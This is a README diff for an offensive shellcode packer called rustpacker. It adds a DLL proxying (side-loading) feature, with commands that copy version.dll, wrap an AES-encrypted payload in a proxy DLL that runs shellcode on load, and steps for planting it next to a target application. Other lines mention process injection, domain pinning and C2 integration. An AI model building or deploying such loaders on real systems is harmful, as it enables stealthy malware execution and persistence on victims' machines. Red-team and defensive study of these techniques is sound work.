@@ -154,6 +154,7 @@ Required:
 Optional:
   -t <PROCESS>      Target process to inject into (default: dllhost.exe, CRT templates only)
   -s <DOMAIN>       Domain pinning: only execute on the specified domain name
+  -p <DLL_PATH>     DLL proxying: path to legitimate DLL to proxy, placed in shared/ (requires -b dll, self-injection templates only)
   -o <PATH>         Custom output path for the resulting binary
   -h                Print help
   -V                Print version
@@ -208,6 +209,20 @@ rustpacker -f shared/payload.raw -i winfiber -e aes -b exe -s MYDOMAIN
 ```bash
 rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -o shared/my_binary.exe
 ```
+
+**DLL proxying (side-loading):**
+```bash
+# 1. Copy the DLL you want to proxy into the shared/ folder (required for container access)
+cp /mnt/c/Windows/System32/version.dll shared/   # from WSL
+# or: copy C:\Windows\System32\version.dll shared\  # from Windows
+
+# 2. Proxy version.dll — compatible with self-injection templates only (ntapc, winfiber, ntfiber, sysfiber)
+rustpacker -f shared/payload.raw -i ntfiber -e aes -b dll -p shared/version.dll
+```
+
+The proxy DLL forwards all exports to the renamed original (`version_orig.dll`) and executes your shellcode on load via `DllMain`. Deploy by placing the proxy DLL alongside the target application with the original DLL renamed (e.g., `version.dll` → `version_orig.dll`).
+
+> **Note:** The `-p` path must be accessible from within the container. Since only `shared/` is volume-mounted, always place the DLL to proxy inside `shared/`.
 
 ## 🛠️ Available Templates
 
@@ -314,7 +329,7 @@ Contributions are welcome! Here's how you can help:
 - [ ] String encryption (litcrypt)
 - [ ] Check DLL support for all templates
 - [x] Add EarlyCascade injection template
-- [ ] Add DLL proxying support
+- [x] Add DLL proxying support
 - prepare integration with mythic c2
 
 ## 🙏 Acknowledgments
